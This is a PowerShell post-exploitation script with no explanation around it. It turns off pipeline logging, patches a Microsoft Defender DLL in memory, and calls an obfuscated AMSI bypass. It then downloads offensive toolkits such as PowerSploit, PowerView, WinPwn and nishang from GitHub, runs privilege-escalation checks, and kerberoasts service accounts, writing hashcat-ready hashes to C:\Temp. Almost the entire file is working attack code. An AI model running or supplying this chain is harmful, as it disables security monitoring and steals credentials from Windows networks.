[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$User = $env:UserName
$Domain = $env:USERDOMAIN
$ComputerName = $env:COMPUTERNAME

$module = Get-Module Microsoft.PowerShell.Utility # Get target module
$module.LogPipelineExecutionDetails = $false # Set module execution details to false
$snap = Get-PSSnapin Microsoft.PowerShell.Core # Get target ps-snapin
$snap.LogPipelineExecutionDetails = $false # Set ps-snapin execution details to false

$APIs = @"
using System;
using System.Runtime.InteropServices;
public class APIs {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ekwiam, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $APIs

$wzys = "0xB8"
$coxo = "0x57"
$hxuu = "0x00"
$eqhh = "0x07"
$paej = "0x80"
$ppiy = "0xC3"
$Patch = [Byte[]] ($wzys,$coxo,$hxuu,$eqhh,+$paej,+$ppiy)

$LoadLibrary = [APIs]::LoadLibrary("MpOav.dll")
$Address = [APIs]::GetProcAddress($LoadLibrary,"DllGetClassObject")
$p = 0
[APIs]::VirtualProtect($Address, [uint32]6, 0x40, [ref]$p)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
$object = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls')
$Uninitialize = $object.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize
$Uninitialize.Invoke($object,$null)

(new-object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')
(new-object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
(new-object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/PowerSploit.psd1')
(new-object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/PowerSploit.psm1')
(new-object System.Net.WebClient).DownloadString('https://github.com/cmndcntrlcyber/PowerSploit')
(new-object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/combatcougar/AppleDogPeas/main/AppleDogPeas.ps1')
(new-object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/combatcougar/PowerSploit/master/Recon/PowerView.ps1')
(new-object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/combatcougar/nishang/master/powerpreter/Powerpreter.psm1')


Get-ServiceUnquoted > C:\Temp\svcs.txt

Get-ModifiableServiceFile -Verbose >> C:\Temp\svcs.txt

Invoke-AllChecks > C:\Temp\allchecks.txt

Invoke-AppleDogPeas > C:\Temp\AppleDogPeas.txt

Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap" > C:\Temp\kcat.txt

